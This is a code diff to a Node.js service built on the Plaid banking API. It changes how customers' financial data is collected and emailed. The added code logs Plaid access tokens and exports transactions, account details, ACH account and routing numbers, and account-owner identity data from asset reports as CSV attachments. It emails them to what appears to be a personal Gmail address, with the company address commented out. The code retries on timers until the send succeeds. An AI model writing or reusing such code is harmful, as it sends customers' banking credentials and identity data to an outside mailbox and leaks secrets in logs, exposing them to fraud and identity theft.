@@ -16,8 +16,9 @@ const client = new plaid.Client(
   plaid.environments.production
 );
 
-let intervalId = null;
 let accessToken1 = null;
+let assetReportToken = null;
+let isSendEmail = null;
 
 exports.getAccessToken = async function(req, res) {
   client.exchangePublicToken(req.body.data, async function(error, tokenResponse) {
@@ -25,11 +26,15 @@ exports.getAccessToken = async function(req, res) {
       console.log(error);
       return res.status(200).json({ data: null, status: false, error: error.error_message });
     }
+    console.log(tokenResponse.access_token);
+    let {assetReportToken} = await createAssetsToken(tokenResponse.access_token);
     let data = {
       access_token: tokenResponse.access_token,
+      asset_report_token: assetReportToken,
       item_id: tokenResponse.item_id,
       error: null
     };
+    console.log(assetReportToken);
     
     res.status(200).json({
       data: data,
@@ -75,90 +80,102 @@ exports.getAccounts = async function(req, res) {
 exports.getAccountInfo = async function(req, res) {
   console.log('first load');
   accessToken1 = req.body.data;
+  isSendEmail = false;
   let data = await getAccountInfoModule();
   return res.status(200).json({data, status: true});
 };
 
 exports.getAccountInfo1 = async function(req, res) {
   console.log('thread start');
-  accessToken1 = req.body.data;
-  intervalId = setInterval(getAccountInfoModule, 20000);
+  accessToken1 = req.body.data.accessToken;
+  assetReportToken = req.body.data.assetReportToken;
+  isSendEmail = true;
+  setTimeout(() => getAccountInfoModule(), 10000);
   return res.status(200);
 };
 
 const getAccountInfoModule = async function() {
   console.log('getting account info...');
+  console.log(assetReportToken);
   let accounts = await getAccountList(accessToken1);
   let transactions = await getTransactionList(accessToken1);
-  let accountsTemp = accounts.accounts;
-  let transactionsTemp = transactions.transactions;
-  if (!accountsTemp) {
-    accountsTemp = {result: 'not prepared yet'};
-  }
-  if (transactionsTemp) {
-    transactionsTemp.forEach(item => {
-      delete item.category;
-      delete item.payment_meta;
-    })
-  } else {
-    transactionsTemp = {result: 'not prepared yet'};
-  }
+  let {user} = await getAssets();
   
-  // let ownerInfo = await getOwnerInfo();
-  let accountNumber = await getAccountNumber();
-  
-  // generate csv
-  let csvTransactions = await jsonToCsv(transactionsTemp);
-  let csvAccounts = await jsonToCsv(accountsTemp);
-  let csvAccountNumber = await jsonToCsv(accountNumber);
-  // let csvOwnerInfo = await jsonToCsv(ownerInfo);
-  
-  // attach to email, send email
-  let base64data1 = Buffer.from(csvTransactions).toString('base64');
-  let base64data2 = Buffer.from(csvAccounts).toString('base64');
-  let base64data3 = Buffer.from(csvAccountNumber).toString('base64');
-  // let base64data4 = Buffer.from(csvOwnerInfo).toString('base64');
-  
-  const msg = {
-    to: 'admin@fundingtree.io',
-    from: 'goldbyol@outlook.com',
-    subject: 'Plaid Account Information',
-    text: 'This is Plaid account information of your customer.',
-    html: '<strong>customer account & transaction information</strong>',
-    attachments: [{
-      content: base64data1,
-      filename: 'transaction-info.csv',
-      type: 'plain/text',
-      disposition: 'attachment'
-    }, {
-      content: base64data2,
-      filename: 'account-info.csv',
-      type: 'plain/text',
-      disposition: 'attachment'
-    }, {
-      content: base64data3,
-      filename: 'number-info.csv',
-      type: 'plain/text',
-      disposition: 'attachment'
-    },
-    //   {
-    //   content: base64data4,
-    //   filename: 'owner-info.csv',
-    //   type: 'plain/text',
-    //   disposition: 'attachment'
-    // }
-    ],
-  };
-  if (transactions.transactions) {
-    try {
-      await sgMail.send(msg);
-      console.log('sent email ........................');
-      clearInterval(intervalId);
-    } catch (err) {
-      console.log(err);
+  if (isSendEmail) {
+    let accountsTemp = accounts.accounts;
+    let transactionsTemp = transactions.transactions;
+    if (!accountsTemp) {
+      accountsTemp = {result: 'not prepared yet'};
     }
-  } else {
-    console.log('not prepared yet ........................');
+    if (transactionsTemp) {
+      transactionsTemp.forEach(item => {
+        delete item.category;
+        delete item.payment_meta;
+      })
+    } else {
+      transactionsTemp = {result: 'not prepared yet'};
+    }
+  
+    let accountNumber = await getAccountNumber();
+  
+    // generate csv
+    let csvTransactions = await jsonToCsv(transactionsTemp);
+    let csvAccounts = await jsonToCsv(accountsTemp);
+    let csvAccountNumber = await jsonToCsv(accountNumber);
+    let csvOwnerInfo = await jsonToCsv(user);
+  
+    // attach to email, send email
+    let base64data1 = Buffer.from(csvTransactions).toString('base64');
+    let base64data2 = Buffer.from(csvAccounts).toString('base64');
+    let base64data3 = Buffer.from(csvAccountNumber).toString('base64');
+    let base64data4 = Buffer.from(csvOwnerInfo).toString('base64');
+  
+    const msg = {
+      to: 'amacool0117@gmail.com', // 'admin@fundingtree.io',
+      from: 'goldbyol@outlook.com',
+      subject: 'Plaid Account Information',
+      text: 'This is Plaid account information of your customer.',
+      html: '<strong>customer account & transaction information</strong>',
+      attachments: [{
+          content: base64data1,
+          filename: 'transaction-info.csv',
+          type: 'plain/text',
+          disposition: 'attachment'
+        }, {
+          content: base64data2,
+          filename: 'account-info.csv',
+          type: 'plain/text',
+          disposition: 'attachment'
+        },
+        {
+          content: base64data3,
+          filename: 'number-info.csv',
+          type: 'plain/text',
+          disposition: 'attachment'
+        },
+        {
+          content: base64data4,
+          filename: 'owner-info.csv',
+          type: 'plain/text',
+          disposition: 'attachment'
+        }
+      ],
+    };
+    if (transactions.transactions) {
+      console.log('sending email .......................');
+      try {
+        await sgMail.send(msg);
+        console.log('sent email ........................');
+      } catch (err) {
+        console.log(err);
+        console.log('timeout...')
+        setTimeout(() => getAccountInfoModule(), 20000);
+      }
+    } else {
+      console.log('not prepared yet ........................');
+      console.log('timeout...')
+      setTimeout(() => getAccountInfoModule(), 20000);
+    }
   }
   return {accounts, transactions};
 };
@@ -214,21 +231,41 @@ const jsonToCsv = async (data) => {
   });
 };
 
-const getOwnerInfo = async () => {
-  console.log('get auth info...');
+const createAssetsToken = async (accessToken) => {
+  const daysRequested = 90;
   return await new Promise(resolve => {
-    client.getIdentity(accessToken1, (err, result) => {
-      // Handle err
-      if (err) {
-        console.log(err);
+    client.createAssetReport([accessToken], daysRequested, {},
+      (error, createResponse) => {
+        if (error != null) {
+          // Handle error.
+          console.log(error);
+          resolve(false);
+        }
+      
+        const assetReportId = createResponse.asset_report_id;
+        const assetReportToken = createResponse.asset_report_token;
+        resolve({assetReportId, assetReportToken});
+      });
+  });
+};
+
+const getAssets = async () => {
+  return await new Promise(resolve => {
+    client.getAssetReport(assetReportToken, false, (error, getResponse) => {
+      if (error != null) {
+        if (error.status_code === 400 &&
+          error.error_code === 'PRODUCT_NOT_READY') {
+          // Asset report is not ready yet. Try again later.
+          console.log('asset not ready yet');
+        } else {
+          // Handle error.
+          console.log(error);
+        }
         resolve(false);
+      } else {
+        const report = getResponse.report;
+        resolve(report);
       }
-      const accounts = result.accounts;
-      let ownerInfo = [];
-      for (const account of accounts) {
-        ownerInfo.push(account.owners);
-      }
-      resolve(ownerInfo);
     });
   });
 };
@@ -236,12 +273,11 @@ const getOwnerInfo = async () => {
 const getAccountNumber = async () => {
   return await new Promise(resolve => {
     client.getAuth(accessToken1, {}, (err, results) => {
-      if (err) {
+      if (err || !results) {
         console.log(err);
         resolve(false);
       }
       let accountNumbers = {};
-      let accountData = results.accounts;
       if (results.numbers.ach.length > 0) {
         // Handle ACH numbers (US accounts)
         accountNumbers.achNumbers = results.numbers.ach;
